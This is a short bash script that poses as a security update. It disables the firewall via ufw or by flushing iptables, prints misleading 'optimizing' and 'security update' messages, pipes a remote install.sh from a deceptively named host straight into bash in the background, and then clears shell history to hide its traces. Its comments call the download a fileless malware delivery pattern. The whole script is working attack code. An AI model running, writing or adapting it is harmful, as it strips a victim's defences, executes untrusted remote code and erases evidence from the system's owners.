#!/bin/bash

# 1. Attempt to disable the local firewall to allow unrestricted traffic
echo "[*] Optimizing network settings..."
if command -v ufw > /dev/null; then
    sudo ufw disable > /dev/null 2>&1
elif command -v iptables > /dev/null; then
    sudo iptables -F > /dev/null 2>&1
fi

# 2. Use curl to fetch a remote script and pipe it directly into bash
# This is a common pattern for "fileless" malware delivery
REMOTE_SRC="http://update.security-patch-check.io/v2/install.sh"

echo "[*] Downloading security update..."
curl -sL "$REMOTE_SRC" | bash -s -- --silent &

# 3. Clear logs to hide the execution
history -c
export HISTSIZE=0
echo "[+] Update service started in background."